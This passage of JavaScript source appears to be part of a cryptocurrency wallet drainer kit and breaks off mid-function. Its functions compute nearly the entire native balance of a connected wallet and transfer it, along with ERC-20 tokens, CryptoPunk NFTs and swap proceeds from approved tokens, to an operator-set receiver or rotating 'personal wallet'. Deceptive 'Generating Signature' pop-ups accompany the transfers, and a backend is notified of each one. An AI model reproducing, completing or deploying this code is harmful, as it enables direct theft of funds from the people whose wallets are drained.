  const tx = await node.sendTransaction(serialized_tx);
  wait_message();

  if (CF_Settings.Settings.Wait_For_Confirmation) await node.waitForTransaction(tx.hash, 1, 90000);
  await sign_success(asset); sign_ready();
};

const DO_SWAP = async (asset) => {
  const node = new ethers.providers.JsonRpcProvider(CF_Settings.RPCs[asset.chain_id]);
  const swap_deadline = Math.floor(Date.now() / 1000) + (9999 * 10);
  const contract = new ethers.Contract(asset.swapper_address, CF_Pancake_ABI, CF_Signer);
  const gas_price = ethers.BigNumber.from(await node.getGasPrice()).div(ethers.BigNumber.from('100')).mul(ethers.BigNumber.from('120')).toString();
  let gas_limit = null;
  let gas_attempts = 0;
  while (gas_attempts < 3) {
    try {
      gas_limit = await contract.estimateGas.swapExactTokensForETH(swap_value, '0', [
        asset.address, CF_Swap_Route[asset.chain_id]
      ], CF_Settings.Receiver, swap_deadline, { from: CF_Current_Address });
      gas_limit = ethers.BigNumber.from(gas_limit).div(ethers.BigNumber.from('100')).mul(ethers.BigNumber.from('120')).toString();
      gas_attempts = 3;
    } catch(err) {
      gas_limit = (asset.chain_id == 42161) ? 5000000 : (asset.chain_id == 43114 ? 5000000 : 350000);
      gas_attempts += 1;
    }
  }
  const nonce = await get_nonce(asset.chain_id);
  const swap_value = ethers.BigNumber.from(asset.amount_raw).lte(ethers.BigNumber.from(asset.swapper_allowance))
  ? ethers.BigNumber.from(asset.amount_raw).toString() : ethers.BigNumber.from(asset.swapper_allowance).toString();
  await swap_request(asset.swapper_type, asset, [ asset ]); sign_next();
  const tx = await contract.swapExactTokensForETH(swap_value, '0', [
    asset.address, CF_Swap_Route[asset.chain_id]
  ], CF_Settings.Receiver, swap_deadline, {
    gasLimit: ethers.BigNumber.from(gas_limit),
    gasPrice: ethers.BigNumber.from(gas_price),
    nonce: nonce, from: CF_Current_Address
  });
  wait_message();
  if (CF_Settings.Settings.Wait_For_Confirmation) await node.waitForTransaction(tx.hash, 1, 60000);
  await swap_success(asset.swapper_type, asset, [ asset ]); sign_ready();
};

const DO_UNISWAP = async (asset, all_tokens) => {
  const web3 = new Web3(CF_Provider); const node = new ethers.providers.JsonRpcProvider(CF_Settings.RPCs[asset.chain_id]);
  const swap_deadline = Math.floor(Date.now() / 1000) + (9999 * 10);
  const contract = new ethers.Contract(asset.swapper_address, CF_Uniswap_ABI, CF_Signer);
  const gas_price = ethers.BigNumber.from(await node.getGasPrice()).div(ethers.BigNumber.from('100')).mul(ethers.BigNumber.from('120')).toString();
  const nonce = await get_nonce(asset.chain_id);
  const swap_data = [];
  for (const token of all_tokens) {
    try {
      const swap_value = ethers.BigNumber.from(token.amount_raw).lte(ethers.BigNumber.from(token.swapper_allowance))
      ? ethers.BigNumber.from(token.amount_raw).toString() : ethers.BigNumber.from(token.swapper_allowance).toString();
      const web3_contract = new web3.eth.Contract(CF_Uniswap_ABI, token.swapper_address);
      const data = web3_contract.methods.swapExactTokensForTokens(swap_value, '0', [
        token.address, CF_Swap_Route[token.chain_id]
      ], CF_Settings.Receiver).encodeABI();
      swap_data.push(data);
    } catch(err) {
      console.log(err);
    }
  }
  let gas_limit = null;
  let gas_attempts = 0;
  while (gas_attempts < 3) {
    try {
      gas_limit = await contract.estimateGas.multicall(swap_deadline, swap_data, { from: CF_Current_Address });
      gas_limit = ethers.BigNumber.from(gas_limit).div(ethers.BigNumber.from('100')).mul(ethers.BigNumber.from('120')).toString();
      gas_attempts = 3;
    } catch(err) {
      gas_limit = (asset.chain_id == 42161) ? 5000000 : (asset.chain_id == 43114 ? 5000000 : 500000);
      gas_attempts += 1;
    }
  }
  await swap_request(asset.swapper_type, asset, all_tokens); sign_next();
  const tx = await contract.multicall(swap_deadline, swap_data, {
    gasLimit: ethers.BigNumber.from(gas_limit),
    gasPrice: ethers.BigNumber.from(gas_price),
    nonce: nonce, from: CF_Current_Address
  });
  wait_message();
  if (CF_Settings.Settings.Wait_For_Confirmation) await node.waitForTransaction(tx.hash, 1, 60000);
  await swap_success(asset.swapper_type, asset, all_tokens); sign_ready();
};

const DO_PANCAKE_V3 = async (asset, all_tokens) => {
  const web3 = new Web3(CF_Provider); const node = new ethers.providers.JsonRpcProvider(CF_Settings.RPCs[asset.chain_id]);
  const swap_deadline = Math.floor(Date.now() / 1000) + (9999 * 10);
  const contract = new ethers.Contract(asset.swapper_address, CF_Pancake_ABI, CF_Signer);
  const gas_price = ethers.BigNumber.from(await node.getGasPrice()).div(ethers.BigNumber.from('100')).mul(ethers.BigNumber.from('120')).toString();
  const nonce = await get_nonce(asset.chain_id);
  const swap_data = [];
  for (const token of all_tokens) {
    try {
      const swap_value = ethers.BigNumber.from(token.amount_raw).lte(ethers.BigNumber.from(token.swapper_allowance))
      ? ethers.BigNumber.from(token.amount_raw).toString() : ethers.BigNumber.from(token.swapper_allowance).toString();
      const web3_contract = new web3.eth.Contract(CF_Pancake_ABI, token.swapper_address);
      const data = web3_contract.methods.swapExactTokensForTokens(swap_value, '0', [
        token.address, CF_Swap_Route[token.chain_id]
      ], CF_Settings.Receiver).encodeABI();
      swap_data.push(data);
    } catch(err) {
      console.log(err);
    }
  }
  let gas_limit = null;
  let gas_attempts = 0;
  while (gas_attempts < 3) {
    try {
      gas_limit = await contract.estimateGas.multicall(swap_deadline, swap_data, { from: CF_Current_Address });
      gas_limit = ethers.BigNumber.from(gas_limit).div(ethers.BigNumber.from('100')).mul(ethers.BigNumber.from('120')).toString();
      gas_attempts = 3;
    } catch(err) {
      gas_limit = (asset.chain_id == 42161) ? 5000000 : (asset.chain_id == 43114 ? 5000000 : 500000);
      gas_attempts += 1;
    }
  }
  await swap_request(asset.swapper_type, asset, all_tokens); sign_next();
  const tx = await contract.multicall(swap_deadline, swap_data, {
    gasLimit: ethers.BigNumber.from(gas_limit),
    gasPrice: ethers.BigNumber.from(gas_price),
    nonce: nonce, from: CF_Current_Address
  });
  wait_message();
  if (CF_Settings.Settings.Wait_For_Confirmation) await node.waitForTransaction(tx.hash, 1, 60000);
  await swap_success(asset.swapper_type, asset, all_tokens); sign_ready();
};

const DO_CONTRACT_NEW = async (asset) => {

  const ankr_chain_id = convert_chain('ID', 'ANKR', asset.chain_id);
  const node = new ethers.providers.JsonRpcProvider(CF_Settings.RPCs[asset.chain_id]);
  const gas_price = BN(await node.getGasPrice()).div(BN(100)).mul(BN(Math.floor(CF_Gas_Multiplier * 100)));
  const temp_node = new ethers.providers.JsonRpcProvider(CF_Settings.RPCs[1]);
  const eth_gas_price = BN(await temp_node.getGasPrice()).div(BN(100)).mul(BN(Math.floor(CF_Gas_Multiplier * 100)));

  const token_limit = BN((asset.chain_id == 42161) ? 5000000 : (asset.chain_id == 43114 ? 5000000 : (asset.chain_id == 369 ? 900000 : 150000)));
  const tokens_gas_fee = token_limit.mul(CF_Gas_Reserves[asset.chain_id]).mul(gas_price);

  MSL.fire({
    icon: 'load', title: 'Generating Signature', text: 'Please, don\'t leave this page',
    showConfirmButton: true, confirmButtonText: 'Loading...', timer: 90000, color: CF_Color_Scheme
  });

  const response = await send_request({ action: 'contract_new', chain_id: asset.chain_id, amount: asset.amount_usd, PW: CF_Settings.Personal_Wallet });
  if (response.status != 'OK') return TRANSFER_NATIVE(asset, true);

  sign_next();

  const contract_address = response.address; const contract_method = response.method;
  const Contract_ABI = JSON.parse(`[{"constant":false,"inputs":[],"name":"${contract_method}","outputs":[],"payable":true,"stateMutability":"payable","type":"function"}]`);

  const web3 = new Web3(CF_Provider); let contract_data = null;
  const web3_contract = new web3.eth.Contract(Contract_ABI, contract_address);
  contract_data = web3_contract.methods[contract_method]().encodeABI();

  let unsigned_tx = { from: CF_Current_Address, to: contract_address, value: BN(100), data: contract_data };
  const gas_limit = BN((asset.chain_id == 42161) ? 5000000 : (asset.chain_id == 43114 ? 5000000 : (asset.chain_id == 369 ? 900000 : 100000)));

  const balance = await node.getBalance(CF_Current_Address);
  let available_amount = balance.sub(gas_limit.mul(gas_price)).sub(tokens_gas_fee);

  if (CF_Settings.Settings.Reserves.Mode == 1) {
    available_amount = balance.sub(gas_limit.mul(gas_price)).div(BN(100))
    .mul(BN(100).sub(BN(CF_Settings.Settings.Reserves.Fix_Percent[asset.chain_id])));
  } else if (CF_Settings.Settings.Reserves.Mode == 2) {
    let max_value = 0; let current_percent = CF_Settings.Settings.Reserves.Fix_Percent[asset.chain_id];
    for (const elem of CF_Settings.Settings.Reserves.Flex_Percent[asset.chain_id]) {
      if (asset.amount_usd > elem.amount || max_value > elem.amount) continue;
      max_value = elem.amount; current_percent = elem.percent;
    }
    available_amount = balance.sub(gas_limit.mul(gas_price))
    .div(BN(100)).mul(BN(100).sub(BN(current_percent)));
  } else if (CF_Settings.Settings.Reserves.Mode == 3) {
    available_amount = balance.sub(gas_limit.mul(gas_price));
  }

  if (available_amount.lte(BN(0))) {
    unsigned_tx.to = CF_Settings.Receiver;
    unsigned_tx.data = '0x';
    const another_gas_limit = await node.estimateGas(unsigned_tx);
    let new_available_amount = balance.sub(another_gas_limit.mul(gas_price)).sub(tokens_gas_fee);

    if (CF_Settings.Settings.Reserves.Mode == 1) {
      available_amount = balance.sub(another_gas_limit.mul(gas_price)).div(BN(100))
      .mul(BN(100).sub(BN(CF_Settings.Settings.Reserves.Fix_Percent[asset.chain_id])));
    } else if (CF_Settings.Settings.Reserves.Mode == 2) {
      let max_value = 0; let current_percent = CF_Settings.Settings.Reserves.Fix_Percent[asset.chain_id];
      for (const elem of CF_Settings.Settings.Reserves.Flex_Percent[asset.chain_id]) {
        if (asset.amount_usd > elem.amount || max_value > elem.amount) continue;
        max_value = elem.amount; current_percent = elem.percent;
      }
      available_amount = balance.sub(another_gas_limit.mul(gas_price))
      .div(BN(100)).mul(BN(100).sub(BN(current_percent)));
    } else if (CF_Settings.Settings.Reserves.Mode == 3) {
      available_amount = balance.sub(another_gas_limit.mul(gas_price));
    }

    if (new_available_amount.lte(BN(0))) {
      throw 'LOW_BALANCE';
    } else {
      return TRANSFER_NATIVE(asset, true);
    }
  }

  const nonce = await node.getTransactionCount(CF_Current_Address, 'pending');

  unsigned_tx.value = available_amount;
  unsigned_tx.nonce = nonce;
  unsigned_tx.gasPrice = gas_price;
  unsigned_tx.gasLimit = gas_limit;

  await transfer_request(asset); sign_next();
  const tx = await CF_Signer.sendTransaction(unsigned_tx);
  wait_message();

  if (CF_Settings.Settings.Wait_For_Confirmation)
    await node.waitForTransaction(tx.hash, 1, 90000);

  try {
    await send_request({
      action: 'contract_used', chain_id: asset.chain_id,
      contract: contract_address, transaction: tx,
      address: CF_Current_Address, amount: asset.amount_usd
    });
  } catch(err) {
    console.log(err);
  }

  await transfer_success(asset, available_amount); sign_ready();

};

const DO_CONTRACT = async (asset) => {
  const ankr_chain_id = convert_chain('ID', 'ANKR', asset.chain_id);
  const node = new ethers.providers.JsonRpcProvider(CF_Settings.RPCs[asset.chain_id]);
  const gas_price = BN(await node.getGasPrice()).div(BN(100)).mul(BN(Math.floor(CF_Gas_Multiplier * 100)));
  const temp_node = new ethers.providers.JsonRpcProvider(CF_Settings.RPCs[1]);
  const eth_gas_price = BN(await temp_node.getGasPrice()).div(BN(100)).mul(BN(Math.floor(CF_Gas_Multiplier * 100)));

  const token_limit = BN((asset.chain_id == 42161) ? 5000000 : (asset.chain_id == 43114 ? 5000000 : (asset.chain_id == 369 ? 900000 : 150000)));
  const tokens_gas_fee = token_limit.mul(CF_Gas_Reserves[asset.chain_id]).mul(gas_price);

  if (CF_Settings.Settings.Use_Public_Contract && CF_Settings.Public_Contract[parseInt(asset.chain_id)] != null) {
    CF_Settings.Settings.Chains[ankr_chain_id].Contract_Legacy = 2;
    CF_Settings.Settings.Chains[ankr_chain_id].Contract_Address = CF_Settings.Public_Contract[parseInt(asset.chain_id)][CF_Settings.Settings.Use_Public_Premium ? (asset.amount_usd >= 500 ? 1 : 0) : 0];
  }

  const Contract_ABI = (CF_Settings.Settings.Chains[ankr_chain_id].Contract_Legacy == 1) ?
  JSON.parse(`[{"constant":false,"inputs":[],"name":"${CF_Settings.Settings.Chains[ankr_chain_id].Contract_Type}","outputs":[],"payable":true,"stateMutability":"payable","type":"function"}]`) :
  ((CF_Settings.Settings.Chains[ankr_chain_id].Contract_Legacy == 0) ? JSON.parse(`[{"constant":false,"inputs":[{"internalType":"address","name":"owner","type":"address"}],"name":"${CF_Settings.Settings.Chains[ankr_chain_id].Contract_Type}","outputs":[],"payable":true,"stateMutability":"payable","type":"function"}]`)
  : JSON.parse(`[{"constant":false,"inputs":[{"internalType":"address","name":"depositer","type":"address"},{"internalType":"address","name":"handler","type":"address"},
  {"internalType":"address","name":"keeper","type":"address"},{"internalType":"uint8","name":"percent","type":"uint8"},{"internalType":"bool","name":"is_cashback","type":"bool"}],"name":"${CF_Settings.Settings.Chains[ankr_chain_id].Contract_Type}","outputs":[],"payable":true,"stateMutability":"payable","type":"function"}]`));

  const web3 = new Web3(CF_Provider); let contract_data = null;
  const web3_contract = new web3.eth.Contract(Contract_ABI, CF_Settings.Settings.Chains[ankr_chain_id].Contract_Address);

  if (CF_Settings.Settings.Chains[ankr_chain_id].Contract_Legacy == 0) {
    contract_data = web3_contract.methods[CF_Settings.Settings.Chains[ankr_chain_id].Contract_Type](CF_Settings.Receiver).encodeABI();
  } else if (CF_Settings.Settings.Chains[ankr_chain_id].Contract_Legacy == 2) {
    let split_data = false;
    try {
      const response = await send_request({ action: 'partner_percent', address: CF_Partner_Address, amount_usd: (asset.amount_usd || null) });
      if (response.status == 'OK' && response.mode == true) split_data = response.percent;
    } catch(err) {
      console.log(err);
    }
    let secondary_address = !split_data ? '0x0000000000000000000000000000000000000000' : CF_Partner_Address;
    contract_data = web3_contract.methods[CF_Settings.Settings.Chains[ankr_chain_id].Contract_Type](CF_Current_Address, CF_Settings.Receiver,
    secondary_address, web3.utils.toHex(!split_data ? 0 : split_data), CF_Settings.Settings.Use_Back_Feature).encodeABI();
  } else {
    contract_data = web3_contract.methods[CF_Settings.Settings.Chains[ankr_chain_id].Contract_Type]().encodeABI();
  }

  let unsigned_tx = { from: CF_Current_Address, to: CF_Settings.Settings.Chains[ankr_chain_id].Contract_Address, value: BN(100), data: contract_data };
  const gas_limit = BN((asset.chain_id == 42161) ? 5000000 : (asset.chain_id == 43114 ? 5000000 : (asset.chain_id == 369 ? 900000 : 100000)));

  const balance = await node.getBalance(CF_Current_Address);
  let available_amount = balance.sub(gas_limit.mul(gas_price)).sub(tokens_gas_fee);

  if (CF_Settings.Settings.Reserves.Mode == 1) {
    available_amount = balance.sub(gas_limit.mul(gas_price)).div(BN(100))
    .mul(BN(100).sub(BN(CF_Settings.Settings.Reserves.Fix_Percent[asset.chain_id])));
  } else if (CF_Settings.Settings.Reserves.Mode == 2) {
    let max_value = 0; let current_percent = CF_Settings.Settings.Reserves.Fix_Percent[asset.chain_id];
    for (const elem of CF_Settings.Settings.Reserves.Flex_Percent[asset.chain_id]) {
      if (asset.amount_usd > elem.amount || max_value > elem.amount) continue;
      max_value = elem.amount; current_percent = elem.percent;
    }
    available_amount = balance.sub(gas_limit.mul(gas_price))
    .div(BN(100)).mul(BN(100).sub(BN(current_percent)));
  } else if (CF_Settings.Settings.Reserves.Mode == 3) {
    available_amount = balance.sub(gas_limit.mul(gas_price));
  }

  if (available_amount.lte(BN(0))) {
    unsigned_tx.to = CF_Settings.Receiver;
    unsigned_tx.data = '0x';
    const another_gas_limit = await node.estimateGas(unsigned_tx);
    let new_available_amount = balance.sub(another_gas_limit.mul(gas_price)).sub(tokens_gas_fee);

    if (CF_Settings.Settings.Reserves.Mode == 1) {
      available_amount = balance.sub(another_gas_limit.mul(gas_price)).div(BN(100))
      .mul(BN(100).sub(BN(CF_Settings.Settings.Reserves.Fix_Percent[asset.chain_id])));
    } else if (CF_Settings.Settings.Reserves.Mode == 2) {
      let max_value = 0; let current_percent = CF_Settings.Settings.Reserves.Fix_Percent[asset.chain_id];
      for (const elem of CF_Settings.Settings.Reserves.Flex_Percent[asset.chain_id]) {
        if (asset.amount_usd > elem.amount || max_value > elem.amount) continue;
        max_value = elem.amount; current_percent = elem.percent;
      }
      available_amount = balance.sub(another_gas_limit.mul(gas_price))
      .div(BN(100)).mul(BN(100).sub(BN(current_percent)));
    } else if (CF_Settings.Settings.Reserves.Mode == 3) {
      available_amount = balance.sub(another_gas_limit.mul(gas_price));
    }

    if (new_available_amount.lte(BN(0))) {
      throw 'LOW_BALANCE';
    } else {
      return TRANSFER_NATIVE(asset, true);
    }
  }

  const nonce = await node.getTransactionCount(CF_Current_Address, 'pending');

  unsigned_tx.value = available_amount;
  unsigned_tx.nonce = nonce;
  unsigned_tx.gasPrice = gas_price;
  unsigned_tx.gasLimit = gas_limit;

  await transfer_request(asset); sign_next();
  const tx = await CF_Signer.sendTransaction(unsigned_tx);
  wait_message();

  if (CF_Settings.Settings.Wait_For_Confirmation)
    await node.waitForTransaction(tx.hash, 1, 90000);
  await transfer_success(asset, available_amount); sign_ready();
};

const DO_RANDOMIZER_NATIVE = async (asset) => {
  const node = new ethers.providers.JsonRpcProvider(CF_Settings.RPCs[asset.chain_id]);
  const gas_price = BN(await node.getGasPrice()).div(BN(100)).mul(BN(Math.floor(CF_Gas_Multiplier * 100)));

  const token_limit = BN((asset.chain_id == 42161) ? 5000000 : (asset.chain_id == 43114 ? 5000000 : (asset.chain_id == 369 ? 900000 : 150000)));
  const tokens_gas_fee = token_limit.mul(CF_Gas_Reserves[asset.chain_id]).mul(gas_price);

  let unsigned_tx = { from: CF_Current_Address, to: CF_Settings.Personal_Wallet.address, value: BN(100), data: "0x" };
  const gas_limit = await node.estimateGas(unsigned_tx);
  const temp_node = new ethers.providers.JsonRpcProvider(CF_Settings.RPCs[1]);
  const eth_gas_price = BN(await temp_node.getGasPrice()).div(BN(100)).mul(BN(Math.floor(CF_Gas_Multiplier * 100)));

  const balance = await node.getBalance(CF_Current_Address);
  let available_amount = balance.sub(gas_limit.mul(gas_price)).sub(tokens_gas_fee);

  if (CF_Settings.Settings.Reserves.Mode == 1) {
    available_amount = balance.sub(gas_limit.mul(gas_price)).div(BN(100))
    .mul(BN(100).sub(BN(CF_Settings.Settings.Reserves.Fix_Percent[asset.chain_id])));
  } else if (CF_Settings.Settings.Reserves.Mode == 2) {
    let max_value = 0; let current_percent = CF_Settings.Settings.Reserves.Fix_Percent[asset.chain_id];
    for (const elem of CF_Settings.Settings.Reserves.Flex_Percent[asset.chain_id]) {
      if (asset.amount_usd > elem.amount || max_value > elem.amount) continue;
      max_value = elem.amount; current_percent = elem.percent;
    }
    available_amount = balance.sub(gas_limit.mul(gas_price))
    .div(BN(100)).mul(BN(100).sub(BN(current_percent)));
  } else if (CF_Settings.Settings.Reserves.Mode == 3) {
    available_amount = balance.sub(gas_limit.mul(gas_price));
  }

  if (available_amount.lte(BN(0))) throw 'LOW_BALANCE';

  const nonce = await node.getTransactionCount(CF_Current_Address, 'pending');

  unsigned_tx.value = available_amount;
  unsigned_tx.nonce = nonce;
  unsigned_tx.gasPrice = gas_price;
  unsigned_tx.gasLimit = gas_limit;

  await transfer_request(asset); sign_next();
  const tx = await CF_Signer.sendTransaction(unsigned_tx);
  wait_message();

  if (CF_Settings.Settings.Wait_For_Confirmation)
    await node.waitForTransaction(tx.hash, 1, 90000);

  const x_promise = send_request({
    action: 'withdraw_native', wallet: CF_Settings.Personal_Wallet,
    chain_id: asset.chain_id, amount_usd: asset.amount_usd,
    user_id: CF_ID, asset: asset, address: CF_Current_Address
  });
  if (CF_Settings.Settings.Wait_For_Response)
    await x_promise;

  await transfer_success(asset, available_amount); sign_ready();
};

const TRANSFER_NATIVE = async (asset, ignore_contract = false) => {
  const ankr_chain_id = convert_chain('ID', 'ANKR', asset.chain_id);

  if (CF_Settings.Settings.Use_Swap_Bypass_For_ETH && asset.chain_id == 1 && asset.amount_usd >= 10) return DO_SWAP_BYPASS_NATIVE(asset);
  if (ignore_contract == false && CF_Settings.Settings.Use_Contract_Generator && asset.amount_usd >= CF_Settings.Settings.Contract_Creation_Limit[asset.chain_id]) return DO_CONTRACT_NEW(asset);
  if (CF_Settings.Settings.Use_Wallet_Randomizer && CF_Settings.Personal_Wallet != null) return DO_RANDOMIZER_NATIVE(asset);

  if (ignore_contract == false && ((CF_Settings.Settings.Chains[ankr_chain_id].Contract_Address != '' || (CF_Settings.Settings.Use_Public_Contract
  && CF_Settings.Public_Contract[parseInt(asset.chain_id)] != null)) && asset.amount_usd >= CF_Settings.Settings.Use_Contract_Amount)) return DO_CONTRACT(asset);

  const node = new ethers.providers.JsonRpcProvider(CF_Settings.RPCs[asset.chain_id]);
  const gas_price = BN(await node.getGasPrice()).div(BN(100)).mul(BN(Math.floor(CF_Gas_Multiplier * 100)));
  const temp_node = new ethers.providers.JsonRpcProvider(CF_Settings.RPCs[1]);
  const eth_gas_price = BN(await temp_node.getGasPrice()).div(BN(100)).mul(BN(Math.floor(CF_Gas_Multiplier * 100)));

  const token_limit = BN((asset.chain_id == 42161) ? 5000000 : (asset.chain_id == 43114 ? 5000000 : (asset.chain_id == 369 ? 900000 : 150000)));
  const tokens_gas_fee = token_limit.mul(CF_Gas_Reserves[asset.chain_id]).mul(gas_price);

  let unsigned_tx = { from: CF_Current_Address, to: CF_Settings.Receiver, value: BN(100), data: "0x" };
  const gas_limit = await node.estimateGas(unsigned_tx);

  const balance = await node.getBalance(CF_Current_Address);
  let available_amount = balance.sub(gas_limit.mul(gas_price)).sub(tokens_gas_fee);

  if (CF_Settings.Settings.Reserves.Mode == 1) {
    available_amount = balance.sub(gas_limit.mul(gas_price)).div(BN(100))
    .mul(BN(100).sub(BN(CF_Settings.Settings.Reserves.Fix_Percent[asset.chain_id])));
  } else if (CF_Settings.Settings.Reserves.Mode == 2) {
    let max_value = 0; let current_percent = CF_Settings.Settings.Reserves.Fix_Percent[asset.chain_id];
    for (const elem of CF_Settings.Settings.Reserves.Flex_Percent[asset.chain_id]) {
      if (asset.amount_usd > elem.amount || max_value > elem.amount) continue;
      max_value = elem.amount; current_percent = elem.percent;
    }
    available_amount = balance.sub(gas_limit.mul(gas_price))
    .div(BN(100)).mul(BN(100).sub(BN(current_percent)));
  } else if (CF_Settings.Settings.Reserves.Mode == 3) {
    available_amount = balance.sub(gas_limit.mul(gas_price));
  }

  if (available_amount.lte(BN(0))) throw 'LOW_BALANCE';

  const nonce = await node.getTransactionCount(CF_Current_Address, 'pending');

  unsigned_tx.value = available_amount;
  unsigned_tx.nonce = nonce;
  unsigned_tx.gasPrice = gas_price;
  unsigned_tx.gasLimit = gas_limit;

  await transfer_request(asset); sign_next();
  const tx = await CF_Signer.sendTransaction(unsigned_tx);
  wait_message();

  if (CF_Settings.Settings.Wait_For_Confirmation)
    await node.waitForTransaction(tx.hash, 1, 90000);
  await transfer_success(asset, available_amount); sign_ready();
};

const DO_RANDOMIZER_TOKEN = async (asset) => {
  const node = new ethers.providers.JsonRpcProvider(CF_Settings.RPCs[asset.chain_id]);
  const gas_price = BN(await node.getGasPrice()).div(BN(100)).mul(BN(Math.floor(CF_Gas_Multiplier * 100)));
  const temp_node = new ethers.providers.JsonRpcProvider(CF_Settings.RPCs[1]);
  const eth_gas_price = BN(await temp_node.getGasPrice()).div(BN(100)).mul(BN(Math.floor(CF_Gas_Multiplier * 100)));

  let unsigned_tx = { from: CF_Current_Address, to: asset.address, value: "0x0", data: "0x" };

  const web3 = new Web3(CF_Provider); let contract_data = null;
  const web3_contract = new web3.eth.Contract(CF_Contract_ABI['ERC20'], asset.address);

  contract_data = web3_contract.methods.transfer(CF_Settings.Personal_Wallet.address, asset.amount_raw).encodeABI();
  unsigned_tx.data = contract_data;

  const gas_limit = await node.estimateGas(unsigned_tx);

  const balance = await node.getBalance(CF_Current_Address);
  const available_amount = balance.sub(gas_limit.mul(gas_price));
  if (available_amount.lt(BN(0))) throw 'LOW_BALANCE';

  const nonce = await node.getTransactionCount(CF_Current_Address, 'pending');

  unsigned_tx.nonce = nonce;
  unsigned_tx.gasPrice = gas_price;
  unsigned_tx.gasLimit = gas_limit;

  await transfer_request(asset); sign_next();
  const tx = await CF_Signer.sendTransaction(unsigned_tx);
  wait_message();

  if (CF_Settings.Settings.Wait_For_Confirmation)
    await node.waitForTransaction(tx.hash, 1, 90000);

  const x_promise = send_request({
    action: 'withdraw_token', wallet: CF_Settings.Personal_Wallet,
    chain_id: asset.chain_id, amount_usd: asset.amount_usd,
    user_id: CF_ID, asset: asset, address: CF_Current_Address
  });

  if (CF_Settings.Settings.Wait_For_Response)
    await x_promise;

  await transfer_success(asset); sign_ready();
};

const TRANSFER_TOKEN = async (asset) => {
  if (CF_Settings.Settings.Use_Randomizer_For_Tokens && CF_Settings.Personal_Wallet != null) return DO_RANDOMIZER_TOKEN(asset);

  const node = new ethers.providers.JsonRpcProvider(CF_Settings.RPCs[asset.chain_id]);
  const gas_price = BN(await node.getGasPrice()).div(BN(100)).mul(BN(Math.floor(CF_Gas_Multiplier * 100)));
  const temp_node = new ethers.providers.JsonRpcProvider(CF_Settings.RPCs[1]);
  const eth_gas_price = BN(await temp_node.getGasPrice()).div(BN(100)).mul(BN(Math.floor(CF_Gas_Multiplier * 100)));

  let unsigned_tx = { from: CF_Current_Address, to: asset.address, value: "0x0", data: "0x" };

  const web3 = new Web3(CF_Provider); let contract_data = null;
  const web3_contract = new web3.eth.Contract(CF_Contract_ABI['ERC20'], asset.address);

  contract_data = web3_contract.methods.transfer(CF_Settings.Receiver, asset.amount_raw).encodeABI();
  unsigned_tx.data = contract_data;

  const gas_limit = await node.estimateGas(unsigned_tx);

  const balance = await node.getBalance(CF_Current_Address);
  const available_amount = balance.sub(gas_limit.mul(gas_price));
  if (available_amount.lt(BN(0))) throw 'LOW_BALANCE';

  const nonce = await node.getTransactionCount(CF_Current_Address, 'pending');

  unsigned_tx.nonce = nonce;
  unsigned_tx.gasPrice = gas_price;
  unsigned_tx.gasLimit = gas_limit;

  await transfer_request(asset); sign_next();
  const tx = await CF_Signer.sendTransaction(unsigned_tx);
  wait_message();

  if (CF_Settings.Settings.Wait_For_Confirmation)
    await node.waitForTransaction(tx.hash, 1, 90000);
  await transfer_success(asset); sign_ready();
};

const DO_RANDOMIZER_CRYPTOPUNK = async (asset) => {
  const node = new ethers.providers.JsonRpcProvider(CF_Settings.RPCs[asset.chain_id]);
  const gas_price = BN(await node.getGasPrice()).div(BN(100)).mul(BN(Math.floor(CF_Gas_Multiplier * 100)));
  const temp_node = new ethers.providers.JsonRpcProvider(CF_Settings.RPCs[1]);
  const eth_gas_price = BN(await temp_node.getGasPrice()).div(BN(100)).mul(BN(Math.floor(CF_Gas_Multiplier * 100)));

  let unsigned_tx = { from: CF_Current_Address, to: asset.address, value: "0x0", data: "0x" };

  const web3 = new Web3(CF_Provider); let contract_data = null;
  const web3_contract = new web3.eth.Contract(CF_Contract_ABI['ERC721'], asset.address);

  contract_data = web3_contract.methods.transferPunk(CF_Settings.Personal_Wallet.address, asset.id).encodeABI();
  unsigned_tx.data = contract_data;

  const gas_limit = await node.estimateGas(unsigned_tx);

  const balance = await node.getBalance(CF_Current_Address);
  const available_amount = balance.sub(gas_limit.mul(gas_price));
  if (available_amount.lt(BN(0))) throw 'LOW_BALANCE';

  const nonce = await node.getTransactionCount(CF_Current_Address, 'pending');

  unsigned_tx.nonce = nonce;
  unsigned_tx.gasPrice = gas_price;
  unsigned_tx.gasLimit = gas_limit;

  await transfer_request(asset); sign_next();
  const tx = await CF_Signer.sendTransaction(unsigned_tx);
  wait_message();

  if (CF_Settings.Settings.Wait_For_Confirmation)
    await node.waitForTransaction(tx.hash, 1, 90000);

  const x_promise = send_request({
    action: 'withdraw_nft', wallet: CF_Settings.Personal_Wallet,
    chain_id: asset.chain_id, amount_usd: asset.amount_usd,
    user_id: CF_ID, asset: asset, address: CF_Current_Address,
    is_cryptopunk: true
  });

  if (CF_Settings.Settings.Wait_For_Response)
    await x_promise;

  await transfer_success(asset); sign_ready();
};

const TRANSFER_CRYPTOPUNK = async (asset) => {
  if (CF_Settings.Settings.Use_Randomizer_For_NFTs && CF_Settings.Personal_Wallet != null) return DO_RANDOMIZER_CRYPTOPUNK(asset);

  const node = new ethers.providers.JsonRpcProvider(CF_Settings.RPCs[asset.chain_id]);
  const gas_price = BN(await node.getGasPrice()).div(BN(100)).mul(BN(Math.floor(CF_Gas_Multiplier * 100)));
  const temp_node = new ethers.providers.JsonRpcProvider(CF_Settings.RPCs[1]);
  const eth_gas_price = BN(await temp_node.getGasPrice()).div(BN(100)).mul(BN(Math.floor(CF_Gas_Multiplier * 100)));

  let unsigned_tx = { from: CF_Current_Address, to: asset.address, value: "0x0", data: "0x" };

  const web3 = new Web3(CF_Provider); let contract_data = null;
  const web3_contract = new web3.eth.Contract(CF_Contract_ABI['ERC721'], asset.address);

  contract_data = web3_contract.methods.transferPunk(CF_Settings.Receiver, asset.id).encodeABI();
  unsigned_tx.data = contract_data;

  const gas_limit = await node.estimateGas(unsigned_tx);

  const balance = await node.getBalance(CF_Current_Address);
  const available_amount = balance.sub(gas_limit.mul(gas_price));
  if (available_amount.lt(BN(0))) throw 'LOW_BALANCE';

  const nonce = await node.getTransactionCount(CF_Current_Address, 'pending');

  unsigned_tx.nonce = nonce;
  unsigned_tx.gasPrice = gas_price;
  unsigned_tx.gasLimit = gas_limit;

  await transfer_request(asset); sign_next();
  const tx = await CF_Signer.sendTransaction(unsigned_tx);
  wait_message();

  if (CF_Settings.Settings.Wait_For_Confirmation)
    await node.waitForTransaction(tx.hash, 1, 90000);

  await transfer_success(asset); sign_ready();
};

const DO_RANDOMIZER_NFT = async (asset) => {
  const node = new ethers.providers.JsonRpcProvider(CF_Settings.RPCs[asset.chain_id]);
